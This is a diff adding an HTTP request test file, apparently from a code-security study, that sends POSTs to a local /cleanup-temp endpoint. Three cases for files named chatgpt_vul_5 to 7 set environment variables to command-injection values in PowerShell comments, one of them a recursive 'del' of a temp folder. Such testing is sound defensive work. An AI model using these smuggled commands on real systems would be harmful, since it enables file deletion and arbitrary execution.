@@ -1,0 +1,27 @@
+### ✅ 정상적인 요청 (빈 JSON 바디)
+POST http://localhost:3000/cleanup-temp
+Content-Type: application/json
+
+{}
+
+### 🚨 for chatgpt_vul_5.js
+# PowerShell:
+# $env:CLEANUP_DIR = 'del /s /q temp && echo PWNED > injected.txt'
+POST http://localhost:3000/cleanup-temp
+Content-Type: application/json
+
+{}
+
+### 🚨 for chatgpt_vul_6.js
+# PowerShell: $env:TEMP_DIR = '"[절대경로]\codeSec\database\shell_command\vulnerable\temp" & echo INJECTED > pwned.txt'
+POST http://localhost:3000/cleanup-temp
+Content-Type: application/json
+
+{}
+
+### 🚨 for chatgpt_vul_7.js
+# PowerShell: $env:TEMP_DIR = '"temp" & echo PWNED > exploited.txt'
+POST http://localhost:3000/cleanup-temp
+Content-Type: application/json
+
+{}
